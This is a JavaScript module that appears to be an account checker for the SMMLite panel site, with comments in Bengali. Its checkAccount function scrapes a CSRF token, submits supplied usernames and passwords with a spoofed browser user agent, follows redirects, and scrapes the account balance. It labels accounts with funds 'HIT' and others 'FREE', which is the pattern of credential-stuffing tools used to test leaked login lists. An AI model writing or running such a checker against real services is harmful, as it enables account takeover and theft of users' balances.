// lib/checkCore.js – SMMLite with proper cookie jar
async function fetchWithCookies(url, options = {}, cookieJar = {}) {
  // কুকি হেডার তৈরি
  const cookieString = Object.entries(cookieJar)
    .map(([k, v]) => `${k}=${v}`)
    .join('; ');
  const headers = {
    ...options.headers,
    'Cookie': cookieString
  };
  const res = await fetch(url, { ...options, headers, redirect: 'manual' });
  
  // Set-Cookie থেকে কুকি জারে যোগ
  const setCookie = res.headers.get('set-cookie');
  if (setCookie) {
    // একাধিক কুকি থাকতে পারে, কমা দিয়ে আলাদা
    const cookies = setCookie.split(',').map(c => c.trim());
    for (const cookie of cookies) {
      const [nameValue, ...parts] = cookie.split(';');
      const [name, value] = nameValue.split('=');
      if (name && value) cookieJar[name.trim()] = value.trim();
    }
  }
  return res;
}

async function fetchWithRetry(url, options = {}, retries = 2) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(url, options);
      return res;
    } catch (e) {
      if (i === retries - 1) throw e;
      await new Promise(r => setTimeout(r, 500));
    }
  }
}

function extractCsrf(html) {
  // বিভিন্ন প্যাটার্ন চেষ্টা
  const patterns = [
    /<input[^>]*name="_csrf"[^>]*value="([^"]+)"/,
    /<input[^>]*name="LoginForm\[_csrf\]"[^>]*value="([^"]+)"/,
    /<input[^>]*name="_csrf"[^>]*value="([^"]+)"/i
  ];
  for (const pattern of patterns) {
    const match = html.match(pattern);
    if (match) return match[1];
  }
  return null;
}

function extractBalance(html) {
  // প্রথমে ক্লাস অনুসন্ধান
  const classRegex = /<[^>]*class="[^"]*(?:money|balance|navbar-money)[^"]*"[^>]*>([^<]*)<\/[^>]*>/g;
  let match;
  while ((match = classRegex.exec(html)) !== null) {
    const text = match[1].trim();
    const numMatch = text.match(/(\d+(?:[.,]\d+)?)/);
    if (numMatch) {
      const num = parseFloat(numMatch[1].replace(',', '.'));
      if (!isNaN(num)) return num;
    }
  }
  // পেজ টেক্সটে $ বা € বা ₺ খুঁজি
  const text = html.replace(/<[^>]*>/g, ' ');
  const globalMatch = text.match(/[\$\€\₺]\s*(\d+(?:[.,]\d+)?)/);
  if (globalMatch) {
    const num = parseFloat(globalMatch[1].replace(',', '.'));
    if (!isNaN(num)) return num;
  }
  return 0;
}

export async function checkAccount(username, password) {
  const userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  const cookieJar = {};

  try {
    // 1. GET হোমপেজ (কুকি পেতে ও CSRF টোকেন পেতে)
    const homeRes = await fetchWithCookies('https://smmlite.com/', {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Referer': 'https://smmlite.com/'
      }
    }, cookieJar);
    const homeHtml = await homeRes.text();

    const csrf = extractCsrf(homeHtml);
    if (!csrf) {
      return { valid: false, hit: false, balance: 0, message: 'CSRF token not found' };
    }

    // 2. POST লগইন (কুকি সহ)
    const formData = new URLSearchParams();
    formData.append('LoginForm[username]', username);
    formData.append('LoginForm[password]', password);
    formData.append('LoginForm[remember]', '1');
    formData.append('_csrf', csrf);

    const loginRes = await fetchWithCookies('https://smmlite.com/', {
      method: 'POST',
      headers: {
        'User-Agent': userAgent,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'https://smmlite.com/',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
      },
      body: formData.toString()
    }, cookieJar);

    // রিডাইরেক্ট ফলো করুন (যদি থাকে)
    let finalHtml;
    let finalUrl = loginRes.url;
    if (loginRes.status >= 300 && loginRes.status < 400) {
      const location = loginRes.headers.get('location');
      if (location) {
        const redirectUrl = location.startsWith('http') ? location : `https://smmlite.com${location}`;
        const followRes = await fetchWithCookies(redirectUrl, {
          method: 'GET',
          headers: {
            'User-Agent': userAgent,
            'Referer': 'https://smmlite.com/'
          }
        }, cookieJar);
        finalHtml = await followRes.text();
        finalUrl = followRes.url;
      } else {
        // লোকেশন হেডার না থাকলে বডি থেকে খুঁজি
        const body = await loginRes.text();
        const match = body.match(/<a href="([^"]+)"/);
        if (match) {
          const redirectUrl = match[1].startsWith('http') ? match[1] : `https://smmlite.com${match[1]}`;
          const followRes = await fetchWithCookies(redirectUrl, {
            method: 'GET',
            headers: {
              'User-Agent': userAgent,
              'Referer': 'https://smmlite.com/'
            }
          }, cookieJar);
          finalHtml = await followRes.text();
          finalUrl = followRes.url;
        } else {
          finalHtml = body;
        }
      }
    } else {
      finalHtml = await loginRes.text();
    }

    // লগইন সফল কিনা চেক
    const isLoggedIn = finalHtml.toLowerCase().includes('logout') || finalUrl.includes('dashboard');
    if (!isLoggedIn) {
      // ডিবাগের জন্য লগ (Vercel লগে দেখতে)
      console.log('Login failed for:', username);
      return { valid: false, hit: false, balance: 0, message: 'Invalid credentials' };
    }

    // ব্যালেন্স এক্সট্র্যাক্ট
    const balance = extractBalance(finalHtml);
    const isHit = balance >= 0.003;

    return {
      valid: true,
      hit: isHit,
      balance: balance,
      message: isHit ? '✅ HIT' : (balance > 0 ? '🆓 FREE (balance < $0.003)' : '🆓 FREE ($0)')
    };

  } catch (err) {
    console.error('Error checking account:', err.message);
    return {
      valid: false,
      hit: false,
      balance: 0,
      message: `Request error: ${err.message}`
    };
  }
}
